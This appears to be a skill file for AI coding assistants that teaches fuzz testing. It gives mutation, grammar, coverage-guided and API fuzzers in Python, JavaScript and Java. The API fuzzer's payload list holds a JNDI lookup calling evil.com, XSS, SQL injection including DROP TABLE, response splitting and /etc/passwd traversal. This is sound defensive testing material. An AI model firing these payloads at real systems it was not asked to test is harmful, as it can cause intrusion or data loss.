---
name: fuzzing-input-generator
description: Generate fuzz testing inputs for security and robustness testing using mutation-based, grammar-based, and coverage-guided fuzzing techniques. Use when.
---

# Fuzzing Input Generator

Generate fuzz testing inputs that discover crashes, security vulnerabilities, memory corruption, hangs, and undefined behaviour by feeding malformed, unexpected, or random data to a target program. This skill covers mutation-based fuzzing, grammar-based fuzzing, coverage-guided fuzzing, and API fuzzing with practical implementations across multiple languages.

## When to Use This Skill

Use this skill when you need to:

- Test parsers, deserializers, and file format handlers against malformed input
- Discover security vulnerabilities (buffer overflows, injection, denial of service)
- Fuzz REST/GraphQL API endpoints with invalid, oversized, or malicious payloads
- Test network protocol implementations against protocol violations
- Generate corpus files for coverage-guided fuzzers (AFL, libFuzzer, Jazzer)
- Build grammar-based fuzzers that produce structurally valid but semantically twisted inputs
- Stress-test input validation and error handling paths
- Verify that a program never crashes, regardless of input

**Trigger phrases**: "fuzz test", "fuzzing", "fuzz inputs", "mutation testing inputs", "crash test", "security fuzzing", "API fuzzing", "grammar fuzzing", "coverage-guided fuzzing", "input corpus", "malformed input", "adversarial inputs"

## What This Skill Does

### Fuzzing Approaches

#### Mutation-Based Fuzzing

Start with a valid input (the seed) and apply random mutations: bit flips, byte insertions, deletions, duplications, and value substitutions. This is the simplest approach and works well when you have a corpus of valid inputs.

**Mutation operators:**
- Bit flip (single bit, adjacent bits, byte-aligned bits)
- Byte replacement (random byte, interesting values like 0x00, 0xFF, 0x7F)
- Block insertion (random bytes, copies of existing blocks)
- Block deletion (remove random byte ranges)
- Arithmetic (add/subtract small values from integers in the input)
- Dictionary substitution (replace tokens with known-interesting values)

#### Grammar-Based Fuzzing

Define the input grammar (JSON, XML, SQL, HTTP) and generate inputs that are syntactically valid but probe semantic edge cases. This is more targeted than mutation-based fuzzing and avoids wasting time on inputs that are rejected at the parser level.

#### Coverage-Guided Fuzzing

Use code coverage feedback to guide input generation toward unexplored code paths. When a mutation increases coverage, the mutated input is added to the corpus. Tools like AFL++, libFuzzer, and Jazzer implement this automatically.

#### API Fuzzing

Send malformed HTTP requests to API endpoints, testing header manipulation, body corruption, parameter injection, oversized payloads, and content-type mismatches.

### Fuzzing Pipeline

1. **Seed corpus creation**: Gather valid sample inputs that exercise basic functionality
2. **Mutation/generation**: Apply mutations or generate from grammars to create test inputs
3. **Execution**: Feed each input to the target and monitor for crashes, hangs, and unexpected behaviour
4. **Coverage tracking**: Record which code paths each input exercises
5. **Corpus management**: Retain inputs that increase coverage; discard redundant ones
6. **Crash triage**: Deduplicate crashes, identify root causes, create reproducible test cases

## Instructions

### Step 1: Build a Mutation-Based Fuzzer

**Python:**
```python
import random
import struct
from typing import Callable


class MutationFuzzer:
    """Simple mutation-based fuzzer that applies random mutations to seed inputs."""

    INTERESTING_BYTES = [0x00, 0x01, 0x7F, 0x80, 0xFF]
    INTERESTING_INTS = [0, 1, -1, 0x7FFFFFFF, -0x80000000, 0xFFFFFFFF, 0x100, 0x1000]

    def __init__(self, seeds: list[bytes], max_mutations: int = 10):
        self.corpus = list(seeds)
        self.max_mutations = max_mutations

    def mutate(self, data: bytes) -> bytes:
        """Apply a random mutation to the input bytes."""
        if len(data) == 0:
            return bytes([random.randint(0, 255)])

        mutation = random.choice([
            self._bit_flip,
            self._byte_replace,
            self._byte_insert,
            self._byte_delete,
            self._block_duplicate,
            self._arithmetic_mutate,
        ])
        return mutation(bytearray(data))

    def _bit_flip(self, data: bytearray) -> bytes:
        idx = random.randint(0, len(data) - 1)
        bit = random.randint(0, 7)
        data[idx] ^= (1 << bit)
        return bytes(data)

    def _byte_replace(self, data: bytearray) -> bytes:
        idx = random.randint(0, len(data) - 1)
        data[idx] = random.choice(self.INTERESTING_BYTES)
        return bytes(data)

    def _byte_insert(self, data: bytearray) -> bytes:
        idx = random.randint(0, len(data))
        data.insert(idx, random.randint(0, 255))
        return bytes(data)

    def _byte_delete(self, data: bytearray) -> bytes:
        if len(data) <= 1:
            return bytes(data)
        idx = random.randint(0, len(data) - 1)
        del data[idx]
        return bytes(data)

    def _block_duplicate(self, data: bytearray) -> bytes:
        if len(data) < 2:
            return bytes(data)
        start = random.randint(0, len(data) - 2)
        length = random.randint(1, min(16, len(data) - start))
        block = data[start:start + length]
        insert_at = random.randint(0, len(data))
        return bytes(data[:insert_at] + block + data[insert_at:])

    def _arithmetic_mutate(self, data: bytearray) -> bytes:
        if len(data) < 4:
            return bytes(data)
        idx = random.randint(0, len(data) - 4)
        value = struct.unpack_from("<I", data, idx)[0]
        value += random.choice([-1, 1, -256, 256])
        value &= 0xFFFFFFFF
        struct.pack_into("<I", data, idx, value)
        return bytes(data)

    def generate(self, count: int) -> list[bytes]:
        """Generate `count` mutated inputs from the corpus."""
        results = []
        for _ in range(count):
            seed = random.choice(self.corpus)
            mutated = seed
            num_mutations = random.randint(1, self.max_mutations)
            for _ in range(num_mutations):
                mutated = self.mutate(mutated)
            results.append(mutated)
        return results

    def fuzz(self, target: Callable[[bytes], None], iterations: int = 1000):
        """Run the fuzzer against a target function, catching crashes."""
        crashes = []
        for i in range(iterations):
            test_input = self.generate(1)[0]
            try:
                target(test_input)
            except Exception as e:
                crashes.append({
                    "input": test_input,
                    "error": str(e),
                    "type": type(e).__name__,
                    "iteration": i,
                })
        return crashes


# Usage example: fuzz a JSON parser
def fuzz_json_parser():
    import json

    seeds = [
        b'{}',
        b'[]',
        b'{"key": "value"}',
        b'[1, 2, 3]',
        b'{"nested": {"deep": true}}',
    ]

    fuzzer = MutationFuzzer(seeds, max_mutations=5)

    def target(data: bytes):
        json.loads(data.decode("utf-8", errors="replace"))

    crashes = fuzzer.fuzz(target, iterations=10000)
    print(f"Found {len(crashes)} unique crash types")
    unique_types = set(c["type"] for c in crashes)
    for t in unique_types:
        example = next(c for c in crashes if c["type"] == t)
        print(f"  {t}: {example['error'][:80]}")
```

**JavaScript:**
```javascript
class MutationFuzzer {
  static INTERESTING_BYTES = [0x00, 0x01, 0x7f, 0x80, 0xff];

  constructor(seeds, maxMutations = 10) {
    this.corpus = seeds.map((s) =>
      typeof s === "string" ? Buffer.from(s) : s
    );
    this.maxMutations = maxMutations;
  }

  mutate(data) {
    if (data.length === 0) {
      return Buffer.from([Math.floor(Math.random() * 256)]);
    }

    const mutations = [
      this.bitFlip,
      this.byteReplace,
      this.byteInsert,
      this.byteDelete,
    ];
    const mutation = mutations[Math.floor(Math.random() * mutations.length)];
    return mutation.call(this, Buffer.from(data));
  }

  bitFlip(data) {
    const idx = Math.floor(Math.random() * data.length);
    const bit = Math.floor(Math.random() * 8);
    data[idx] ^= 1 << bit;
    return data;
  }

  byteReplace(data) {
    const idx = Math.floor(Math.random() * data.length);
    data[idx] =
      MutationFuzzer.INTERESTING_BYTES[
        Math.floor(Math.random() * MutationFuzzer.INTERESTING_BYTES.length)
      ];
    return data;
  }

  byteInsert(data) {
    const idx = Math.floor(Math.random() * (data.length + 1));
    const byte = Math.floor(Math.random() * 256);
    return Buffer.concat([data.slice(0, idx), Buffer.from([byte]), data.slice(idx)]);
  }

  byteDelete(data) {
    if (data.length <= 1) return data;
    const idx = Math.floor(Math.random() * data.length);
    return Buffer.concat([data.slice(0, idx), data.slice(idx + 1)]);
  }

  fuzz(target, iterations = 1000) {
    const crashes = [];
    for (let i = 0; i < iterations; i++) {
      const seed = this.corpus[Math.floor(Math.random() * this.corpus.length)];
      let mutated = Buffer.from(seed);
      const numMutations = Math.floor(Math.random() * this.maxMutations) + 1;
      for (let m = 0; m < numMutations; m++) {
        mutated = this.mutate(mutated);
      }
      try {
        target(mutated);
      } catch (e) {
        crashes.push({ input: mutated, error: e.message, iteration: i });
      }
    }
    return crashes;
  }
}

// Usage: fuzz a JSON parser
const fuzzer = new MutationFuzzer(['{}', '[]', '{"key":"value"}']);
const crashes = fuzzer.fuzz((data) => {
  JSON.parse(data.toString("utf-8"));
}, 10000);
console.log(`Found ${crashes.length} crashes`);
```

**Java:**
```java
import java.util.*;

public class MutationFuzzer {

    private static final byte[] INTERESTING = {0x00, 0x01, 0x7F, (byte) 0x80, (byte) 0xFF};
    private final List<byte[]> corpus;
    private final Random rng;
    private final int maxMutations;

    public MutationFuzzer(List<byte[]> seeds, int maxMutations) {
        this.corpus = new ArrayList<>(seeds);
        this.rng = new Random();
        this.maxMutations = maxMutations;
    }

    public byte[] mutate(byte[] data) {
        if (data.length == 0) {
            return new byte[]{(byte) rng.nextInt(256)};
        }
        int mutation = rng.nextInt(3);
        byte[] copy = data.clone();
        return switch (mutation) {
            case 0 -> bitFlip(copy);
            case 1 -> byteReplace(copy);
            case 2 -> byteInsert(copy);
            default -> copy;
        };
    }

    private byte[] bitFlip(byte[] data) {
        int idx = rng.nextInt(data.length);
        int bit = rng.nextInt(8);
        data[idx] ^= (byte) (1 << bit);
        return data;
    }

    private byte[] byteReplace(byte[] data) {
        int idx = rng.nextInt(data.length);
        data[idx] = INTERESTING[rng.nextInt(INTERESTING.length)];
        return data;
    }

    private byte[] byteInsert(byte[] data) {
        int idx = rng.nextInt(data.length + 1);
        byte[] result = new byte[data.length + 1];
        System.arraycopy(data, 0, result, 0, idx);
        result[idx] = (byte) rng.nextInt(256);
        System.arraycopy(data, idx, result, idx + 1, data.length - idx);
        return result;
    }

    public record CrashInfo(byte[] input, String error, int iteration) {}

    public List<CrashInfo> fuzz(java.util.function.Consumer<byte[]> target, int iterations) {
        var crashes = new ArrayList<CrashInfo>();
        for (int i = 0; i < iterations; i++) {
            byte[] seed = corpus.get(rng.nextInt(corpus.size()));
            byte[] mutated = seed.clone();
            int numMuts = rng.nextInt(maxMutations) + 1;
            for (int m = 0; m < numMuts; m++) {
                mutated = mutate(mutated);
            }
            try {
                target.accept(mutated);
            } catch (Exception e) {
                crashes.add(new CrashInfo(mutated, e.getMessage(), i));
            }
        }
        return crashes;
    }
}
```

### Step 2: Build a Grammar-Based Fuzzer

**Python:**
```python
import random
import string


class GrammarFuzzer:
    """Generate inputs from a context-free grammar with controlled randomness."""

    def __init__(self, grammar: dict, start: str = "<start>", max_depth: int = 10):
        self.grammar = grammar
        self.start = start
        self.max_depth = max_depth

    def generate(self, symbol: str = None, depth: int = 0) -> str:
        if symbol is None:
            symbol = self.start

        if symbol not in self.grammar:
            return symbol  # Terminal symbol

        expansions = self.grammar[symbol]

        if depth >= self.max_depth:
            # Choose the shortest expansion to terminate
            expansions = sorted(expansions, key=lambda e: len(e))
            expansion = expansions[0]
        else:
            expansion = random.choice(expansions)

        result = ""
        for part in expansion:
            result += self.generate(part, depth + 1)
        return result


# JSON grammar for fuzzing JSON parsers
JSON_GRAMMAR = {
    "<start>": [["<value>"]],
    "<value>": [
        ["<object>"], ["<array>"], ["<string>"], ["<number>"],
        ["true"], ["false"], ["null"],
    ],
    "<object>": [
        ["{", "}"],
        ["{", "<members>", "}"],
    ],
    "<members>": [
        ["<pair>"],
        ["<pair>", ",", "<members>"],
    ],
    "<pair>": [["<string>", ":", "<value>"]],
    "<array>": [
        ["[", "]"],
        ["[", "<elements>", "]"],
    ],
    "<elements>": [
        ["<value>"],
        ["<value>", ",", "<elements>"],
    ],
    "<string>": [
        ['"', "<chars>", '"'],
        ['"', '"'],
    ],
    "<chars>": [
        ["<char>"],
        ["<char>", "<chars>"],
    ],
    "<char>": [[c] for c in string.ascii_letters + string.digits + " _-"],
    "<number>": [
        ["<digits>"],
        ["-", "<digits>"],
        ["<digits>", ".", "<digits>"],
        ["<digits>", "e", "<digits>"],
    ],
    "<digits>": [
        ["<digit>"],
        ["<digit>", "<digits>"],
    ],
    "<digit>": [[str(d)] for d in range(10)],
}

# Generate fuzzed JSON inputs
fuzzer = GrammarFuzzer(JSON_GRAMMAR, max_depth=8)
for _ in range(10):
    fuzzed_json = fuzzer.generate()
    print(repr(fuzzed_json))
```

**JavaScript:**
```javascript
class GrammarFuzzer {
  constructor(grammar, start = "<start>", maxDepth = 10) {
    this.grammar = grammar;
    this.start = start;
    this.maxDepth = maxDepth;
  }

  generate(symbol = null, depth = 0) {
    if (symbol === null) symbol = this.start;
    if (!(symbol in this.grammar)) return symbol;

    let expansions = this.grammar[symbol];

    if (depth >= this.maxDepth) {
      expansions = [...expansions].sort((a, b) => a.length - b.length);
      expansions = [expansions[0]];
    }

    const expansion = expansions[Math.floor(Math.random() * expansions.length)];
    return expansion.map((part) => this.generate(part, depth + 1)).join("");
  }
}

// SQL grammar for fuzzing SQL parsers
const SQL_GRAMMAR = {
  "<start>": [["<statement>"]],
  "<statement>": [
    ["SELECT ", "<columns>", " FROM ", "<table>"],
    ["SELECT ", "<columns>", " FROM ", "<table>", " WHERE ", "<condition>"],
    ["INSERT INTO ", "<table>", " VALUES (", "<values>", ")"],
  ],
  "<columns>": [["*"], ["<column>"], ["<column>", ", ", "<columns>"]],
  "<column>": [["id"], ["name"], ["email"], ["age"], ["created_at"]],
  "<table>": [["users"], ["orders"], ["products"]],
  "<condition>": [
    ["<column>", " = ", "<literal>"],
    ["<column>", " > ", "<number>"],
    ["<column>", " IS NULL"],
    ["<condition>", " AND ", "<condition>"],
  ],
  "<values>": [["<literal>"], ["<literal>", ", ", "<values>"]],
  "<literal>": [["'", "<word>", "'"], ["<number>"], ["NULL"]],
  "<word>": [["test"], ["hello"], ["admin"], ["' OR 1=1 --"]],
  "<number>": [["0"], ["1"], ["-1"], ["999999"], ["2147483647"]],
};

const fuzzer = new GrammarFuzzer(SQL_GRAMMAR, "<start>", 6);
for (let i = 0; i < 10; i++) {
  console.log(fuzzer.generate());
}
```

### Step 3: Set Up Coverage-Guided Fuzzing

**Python (with Atheris, Google's Python fuzzer):**
```python
# Install: pip install atheris

import atheris
import sys
import json


@atheris.instrument_func
def fuzz_json_parser(data):
    """Coverage-guided fuzz target for the JSON parser."""
    try:
        fdp = atheris.FuzzedDataProvider(data)
        json_str = fdp.ConsumeUnicodeNoSurrogates(fdp.remaining_bytes())
        json.loads(json_str)
    except (json.JSONDecodeError, UnicodeDecodeError):
        pass  # Expected errors, not crashes


@atheris.instrument_func
def fuzz_url_parser(data):
    """Coverage-guided fuzz target for URL parsing."""
    from urllib.parse import urlparse, parse_qs
    try:
        fdp = atheris.FuzzedDataProvider(data)
        url = fdp.ConsumeUnicodeNoSurrogates(fdp.remaining_bytes())
        parsed = urlparse(url)
        if parsed.query:
            parse_qs(parsed.query)
    except Exception:
        pass  # Document but do not suppress unexpected exceptions


def main():
    atheris.Setup(sys.argv, fuzz_json_parser)
    atheris.Fuzz()


if __name__ == "__main__":
    main()

# Run: python fuzz_target.py -max_total_time=60 corpus/
```

**Java (Jazzer):**
```java
import com.code_intelligence.jazzer.api.FuzzedDataProvider;
import com.fasterxml.jackson.databind.ObjectMapper;

/**
 * Jazzer fuzz target for Jackson JSON parser.
 * Run: jazzer --target_class=JsonFuzzTarget --corpus=corpus/
 */
public class JsonFuzzTarget {

    private static final ObjectMapper mapper = new ObjectMapper();

    public static void fuzzerTestOneInput(FuzzedDataProvider data) {
        String jsonStr = data.consumeRemainingAsString();
        try {
            mapper.readTree(jsonStr);
        } catch (com.fasterxml.jackson.core.JsonProcessingException e) {
            // Expected: malformed JSON
        } catch (Exception e) {
            // Unexpected exception type indicates a potential bug
            throw e;
        }
    }
}
```

### Step 4: Implement API Fuzzing

**Python:**
```python
import requests
import random
import string
import json


class ApiFuzzer:
    """Fuzz REST API endpoints with malformed requests."""

    MALICIOUS_STRINGS = [
        "",
        " ",
        "\x00",
        "null",
        "undefined",
        "true",
        "false",
        "-1",
        "0",
        "9999999999999999999",
        "{{template}}",
        "${jndi:ldap://evil.com/a}",
        "<script>alert(1)</script>",
        "' OR '1'='1",
        "Robert'); DROP TABLE users;--",
        "a" * 10000,
        "\r\n\r\nHTTP/1.1 200 OK\r\n",
        "../../../etc/passwd",
    ]

    def __init__(self, base_url: str):
        self.base_url = base_url
        self.findings = []

    def fuzz_json_body(self, endpoint: str, valid_body: dict, iterations: int = 100):
        """Fuzz a JSON API endpoint by mutating the request body."""
        for i in range(iterations):
            mutated = self._mutate_json(valid_body)
            try:
                response = requests.post(
                    f"{self.base_url}{endpoint}",
                    json=mutated,
                    timeout=5,
                )
                if response.status_code >= 500:
                    self.findings.append({
                        "type": "server_error",
                        "endpoint": endpoint,
                        "status": response.status_code,
                        "body": mutated,
                        "response": response.text[:500],
                        "iteration": i,
                    })
            except requests.Timeout:
                self.findings.append({
                    "type": "timeout",
                    "endpoint": endpoint,
                    "body": mutated,
                    "iteration": i,
                })
            except requests.ConnectionError:
                self.findings.append({
                    "type": "connection_error",
                    "endpoint": endpoint,
                    "body": mutated,
                    "iteration": i,
                })

    def _mutate_json(self, obj: dict) -> dict:
        """Apply random mutations to a JSON object."""
        mutated = json.loads(json.dumps(obj))
        mutation = random.choice([
            self._replace_value,
            self._add_extra_field,
            self._remove_field,
            self._change_type,
            self._inject_malicious,
        ])
        return mutation(mutated)

    def _replace_value(self, obj: dict) -> dict:
        if not obj:
            return obj
        key = random.choice(list(obj.keys()))
        obj[key] = random.choice([None, 0, -1, "", [], {}, True, False])
        return obj

    def _add_extra_field(self, obj: dict) -> dict:
        obj["__fuzz_" + "".join(random.choices(string.ascii_lowercase, k=5))] = (
            random.choice(self.MALICIOUS_STRINGS)
        )
        return obj

    def _remove_field(self, obj: dict) -> dict:
        if obj:
            key = random.choice(list(obj.keys()))
            del obj[key]
        return obj

    def _change_type(self, obj: dict) -> dict:
        if not obj:
            return obj
        key = random.choice(list(obj.keys()))
        original = obj[key]
        if isinstance(original, str):
            obj[key] = random.randint(-1000, 1000)
        elif isinstance(original, (int, float)):
            obj[key] = "not_a_number"
        elif isinstance(original, bool):
            obj[key] = "maybe"
        elif isinstance(original, list):
            obj[key] = "not_a_list"
        return obj

    def _inject_malicious(self, obj: dict) -> dict:
        if not obj:
            return obj
        key = random.choice(list(obj.keys()))
        obj[key] = random.choice(self.MALICIOUS_STRINGS)
        return obj


# Usage
fuzzer = ApiFuzzer("http://localhost:8000")
fuzzer.fuzz_json_body("/api/users", {
    "email": "test@example.com",
    "name": "Test User",
    "age": 25,
})
print(f"Found {len(fuzzer.findings)} issues")
for f in fuzzer.findings:
    print(f"  [{f['type']}] {f.get('status', 'N/A')}: {json.dumps(f['body'])[:100]}")
```

### Step 5: Manage the Input Corpus

**Python:**
```python
import hashlib
import os
import json
from pathlib import Path


class CorpusManager:
    """Manage fuzz test input corpus with deduplication and coverage tracking."""

    def __init__(self, corpus_dir: str):
        self.corpus_dir = Path(corpus_dir)
        self.corpus_dir.mkdir(parents=True, exist_ok=True)
        self.coverage_map = {}

    def add_seed(self, data: bytes, name: str = None) -> str:
        """Add a seed input to the corpus."""
        digest = hashlib.sha256(data).hexdigest()[:16]
        filename = name or f"seed_{digest}"
        filepath = self.corpus_dir / filename
        filepath.write_bytes(data)
        return str(filepath)

    def add_if_new_coverage(self, data: bytes, coverage: set) -> bool:
        """Add input to corpus only if it covers new code paths."""
        new_paths = coverage - set(self.coverage_map.keys())
        if new_paths:
            digest = hashlib.sha256(data).hexdigest()[:16]
            filepath = self.corpus_dir / f"cov_{digest}"
            filepath.write_bytes(data)
            for path in new_paths:
                self.coverage_map[path] = str(filepath)
            return True
        return False

    def load_corpus(self) -> list[bytes]:
        """Load all inputs from the corpus directory."""
        inputs = []
        for filepath in sorted(self.corpus_dir.iterdir()):
            if filepath.is_file():
                inputs.append(filepath.read_bytes())
        return inputs

    def minimize_corpus(self, coverage_fn):
        """Remove corpus entries that do not contribute unique coverage."""
        entries = []
        for filepath in sorted(self.corpus_dir.iterdir()):
            if filepath.is_file():
                data = filepath.read_bytes()
                coverage = coverage_fn(data)
                entries.append((filepath, data, coverage))

        # Greedy set cover: keep entries that contribute unique coverage
        total_coverage = set()
        kept = []
        entries.sort(key=lambda e: len(e[2]), reverse=True)
        for filepath, data, coverage in entries:
            new_coverage = coverage - total_coverage
            if new_coverage:
                kept.append(filepath)
                total_coverage |= coverage
            else:
                filepath.unlink()

        return len(kept)
```

## Best Practices

- **Start with a good seed corpus**: The quality of mutation-based fuzzing depends on the initial seeds; include valid inputs that exercise different code paths, file format features, and API operations
- **Use coverage-guided fuzzing for native code**: For C, C++, Rust, and Go targets, coverage-guided fuzzers (AFL++, libFuzzer) are dramatically more effective than blind mutation
- **Use grammar-based fuzzing for structured inputs**: Mutation of random bytes rarely produces valid SQL, JSON, or XML; grammar-based generation spends more time on semantically interesting inputs
- **Run fuzzers continuously**: Fuzzing finds more bugs with more time; run fuzzers in CI as long-running jobs (hours or days), not just as quick smoke tests
- **Triage crashes by unique stack trace**: Many crash inputs trigger the same bug; deduplicate by hashing the crash stack trace to focus on unique root causes
- **Save every crash-triggering input**: Store crash inputs in a permanent corpus so they can be used as regression tests after fixes
- **Set resource limits**: Fuzz targets should have memory limits (to catch memory exhaustion) and time limits (to catch infinite loops and hangs)
- **Separate expected errors from crashes**: A JSON parser throwing `JSONDecodeError` on malformed input is correct behaviour; a segfault or unhandled exception is a bug

## Common Pitfalls

- **Fuzzing without any seeds**: Starting from empty or random bytes wastes time; even a single valid input as a seed dramatically improves mutation-based fuzzing effectiveness
- **Ignoring timeout findings**: A fuzz input that causes the target to hang for 30 seconds is as much a bug as a crash; these often indicate algorithmic complexity attacks (ReDoS, hash collision DoS)
- **Not running long enough**: Many bugs are only found after millions of iterations; running a fuzzer for 60 seconds and declaring the code safe is misleading
- **Suppressing all exceptions**: Catching `Exception` in the fuzz target and ignoring it hides real bugs; only suppress expected error types (e.g., `JSONDecodeError`) and let unexpected exceptions propagate
- **Not minimizing crash inputs**: A 10KB crash input is hard to debug; use the fuzzer's minimization feature (e.g., `afl-tmin`) to reduce it to the smallest input that still triggers the crash
- **Fuzzing only in development**: Fuzzing should be part of CI, not just a one-time developer activity; new code introduces new bugs that fuzzing can find
- **Not testing error paths**: Fuzzing primarily exercises error handling paths; if your code lacks proper error handling, fuzzing will reveal this as crashes rather than graceful failures
- **Using production URLs for API fuzzing**: Always fuzz against local or staging environments; never send fuzz traffic to production
